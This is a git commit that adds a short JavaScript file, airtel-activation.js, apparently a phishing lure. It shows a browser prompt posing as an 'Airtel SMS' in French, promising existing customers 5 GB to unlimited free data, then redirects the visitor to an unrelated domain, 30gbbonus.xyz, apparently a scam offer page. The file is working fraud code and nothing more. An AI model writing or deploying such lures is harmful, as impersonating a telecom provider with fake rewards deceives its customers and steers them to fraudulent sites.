be851c2ffe69cf3d4dd2751d0b78160f36d64e2e
xmasdata <152927198+xmasdata@users.noreply.github.com>
2024-05-29 08:25:38 -0700

    Create airtel-activation.js

---
+++ airtel-activation.js
@@ -0,0 +1,6 @@
+
+var password = '1'
+password=prompt('Airtel SMS: Cher client, veuillez vérifier si votre carte SIM Airtel est éligible pour recevoir de 5 Go à des données illimitées, récompense des anciens clients, appuyez sur 1 pour vérifier maintenant. ','1');
+if (password != '1') {
+location.href='https://30gbbonus.xyz/felixoffer.html';
+}
